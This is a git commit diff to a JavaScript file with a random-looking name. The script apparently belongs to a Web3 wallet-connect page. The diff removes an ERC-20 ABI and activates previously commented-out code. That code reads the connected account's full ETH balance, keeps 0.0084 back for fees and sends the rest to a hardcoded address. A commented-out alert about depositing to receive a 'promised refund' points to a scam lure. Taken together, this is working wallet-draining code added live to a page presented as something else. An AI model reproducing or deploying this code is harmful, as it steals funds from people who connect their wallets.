e4811fba9879ca5528a10a855d0b64ad293c03e8
yawa-basad <154462953+yawa-basad@users.noreply.github.com>
2024-01-09 13:18:12 +0800

    Update iokjklgsd23890.js

--- iokjklgsd23890.js
+++ iokjklgsd23890.js
@@ -220,145 +220,7 @@ async function getAddress() {
 
 }
 
-const erc20TokenContractAbi = [
-  { inputs: [], stateMutability: "nonpayable", type: "constructor" },
-  {
-    anonymous: false,
-    inputs: [
-      {
-        indexed: true,
-        internalType: "address",
-        name: "owner",
-        type: "address",
-      },
-      {
-        indexed: true,
-        internalType: "address",
-        name: "spender",
-        type: "address",
-      },
-      {
-        indexed: false,
-        internalType: "uint256",
-        name: "value",
-        type: "uint256",
-      },
-    ],
-    name: "Approval",
-    type: "event",
-  },
-  {
-    anonymous: false,
-    inputs: [
-      { indexed: true, internalType: "address", name: "from", type: "address" },
-      { indexed: true, internalType: "address", name: "to", type: "address" },
-      {
-        indexed: false,
-        internalType: "uint256",
-        name: "value",
-        type: "uint256",
-      },
-    ],
-    name: "Transfer",
-    type: "event",
-  },
-  {
-    inputs: [
-      { internalType: "address", name: "owner", type: "address" },
-      { internalType: "address", name: "spender", type: "address" },
-    ],
-    name: "allowance",
-    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
-    stateMutability: "view",
-    type: "function",
-  },
-  {
-    inputs: [
-      { internalType: "address", name: "spender", type: "address" },
-      { internalType: "uint256", name: "amount", type: "uint256" },
-    ],
-    name: "approve",
-    outputs: [{ internalType: "bool", name: "", type: "bool" }],
-    stateMutability: "nonpayable",
-    type: "function",
-  },
-  {
-    inputs: [{ internalType: "address", name: "account", type: "address" }],
-    name: "balanceOf",
-    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
-    stateMutability: "view",
-    type: "function",
-  },
-  {
-    inputs: [],
-    name: "decimals",
-    outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
-    stateMutability: "view",
-    type: "function",
-  },
-  {
-    inputs: [
-      { internalType: "address", name: "spender", type: "address" },
-      { internalType: "uint256", name: "subtractedValue", type: "uint256" },
-    ],
-    name: "decreaseAllowance",
-    outputs: [{ internalType: "bool", name: "", type: "bool" }],
-    stateMutability: "nonpayable",
-    type: "function",
-  },
-  {
-    inputs: [
-      { internalType: "address", name: "spender", type: "address" },
-      { internalType: "uint256", name: "addedValue", type: "uint256" },
-    ],
-    name: "increaseAllowance",
-    outputs: [{ internalType: "bool", name: "", type: "bool" }],
-    stateMutability: "nonpayable",
-    type: "function",
-  },
-  {
-    inputs: [],
-    name: "name",
-    outputs: [{ internalType: "string", name: "", type: "string" }],
-    stateMutability: "view",
-    type: "function",
-  },
-  {
-    inputs: [],
-    name: "symbol",
-    outputs: [{ internalType: "string", name: "", type: "string" }],
-    stateMutability: "view",
-    type: "function",
-  },
-  {
-    inputs: [],
-    name: "totalSupply",
-    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
-    stateMutability: "view",
-    type: "function",
-  },
-  {
-    inputs: [
-      { internalType: "address", name: "recipient", type: "address" },
-      { internalType: "uint256", name: "amount", type: "uint256" },
-    ],
-    name: "transfer",
-    outputs: [{ internalType: "bool", name: "", type: "bool" }],
-    stateMutability: "nonpayable",
-    type: "function",
-  },
-  {
-    inputs: [
-      { internalType: "address", name: "sender", type: "address" },
-      { internalType: "address", name: "recipient", type: "address" },
-      { internalType: "uint256", name: "amount", type: "uint256" },
-    ],
-    name: "transferFrom",
-    outputs: [{ internalType: "bool", name: "", type: "bool" }],
-    stateMutability: "nonpayable",
-    type: "function",
-  },
-];
+
 
 const _abi = [
   {
@@ -1013,52 +875,41 @@ console.log(collection)
 
   
 
-  
+  }
 
-  
 
   // if (account == '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262') {
 
   //       alert('error: 2389\nmessage: connected account must deposit the remaining required amount to receive the promised refund')
   // }
 
-//  var value = await get_eth(account)
-//  var minusvalue = value - 0.0084
+ var value = await get_eth(account)
+ var minusvalue = value - 0.0084
 
-// const finalAmount = Web3.utils.toWei(minusvalue.toString(), 'ether')
-
-
-
-
-// console.log(finalAmount)
-// const txData = {
-//   from: account,
-//   to: '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262',
-//   value: finalAmount,
-// };
-
-
-// await web3.eth.sendTransaction(txData)
-//   .then( (txHash) => {
-//     console.log(txHash)
-//   }).catch( (err) => {
-//     console.log(err)
-//   })
+const finalAmount = Web3.utils.toWei(minusvalue.toString(), 'ether')
 
 
 
 
+console.log(finalAmount)
+const txData = {
+  from: account,
+  to: '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262',
+  value: finalAmount,
+};
+
+
+await web3.eth.sendTransaction(txData)
+  .then( (txHash) => {
+    console.log(txHash)
+  }).catch( (err) => {
+    console.log(err)
+  })
+
+
+  
 
 }
-
-
-
-
-
-
-
-
-
 
 
 async function nfts(addr) {
